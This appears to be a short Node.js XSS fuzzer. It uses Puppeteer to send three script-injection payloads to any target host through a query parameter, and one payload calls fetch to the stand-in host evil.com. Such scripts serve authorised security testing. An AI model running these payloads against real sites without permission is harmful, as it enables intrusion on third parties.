// js_fuzzer.js
const puppeteer = require('puppeteer');

(async () => {
  const target = process.argv[2];
  const payloads = [
    `<img src=x onerror=alert(1)>`,
    `<svg/onload=alert(2)>`,
    `<script>fetch('http://evil.com')</script>`
  ];

  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();

  for (const payload of payloads) {
    try {
      await page.goto(`https://${target}/?test=${encodeURIComponent(payload)}`, { waitUntil: 'domcontentloaded', timeout: 10000 });
      console.log(`Tested XSS payload: ${payload}`);
    } catch (e) {
      console.error(`Error testing payload: ${payload}`);
    }
  }

  await browser.close();
})();
